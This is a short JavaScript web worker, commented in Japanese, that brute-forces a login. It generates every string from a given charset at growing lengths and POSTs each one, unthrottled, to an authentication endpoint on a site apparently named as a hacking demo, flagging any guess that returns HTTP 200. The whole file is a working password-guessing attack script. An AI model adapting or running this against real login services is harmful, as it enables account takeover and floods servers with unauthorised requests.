self.addEventListener('message', async (event) => {
    const { charset } = event.data;
    let length = 1;

    while (true) {
        const combinations = generateCombinations(charset, length);
        for (let combo of combinations) {
            // 非同期でリクエストを送信
            fetch('https://hackingdemo.vercel.app/api/auth.js', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ input: combo })
            })
            .then(response => {
                self.postMessage({ combo, status: response.status });
                if (response.status === 200) {
                    self.postMessage({ success: combo });
                }
            })
            .catch(error => {
                self.postMessage({ error: `Error: ${error}` });
            });
        }
        length++; // 次の長さに進む
    }

    function generateCombinations(charset, length) {
        const result = [];
        function helper(prefix) {
            if (prefix.length === length) {
                result.push(prefix);
                return;
            }
            for (let char of charset) {
                helper(prefix + char);
            }
        }
        helper('');
        return result;
    }
});
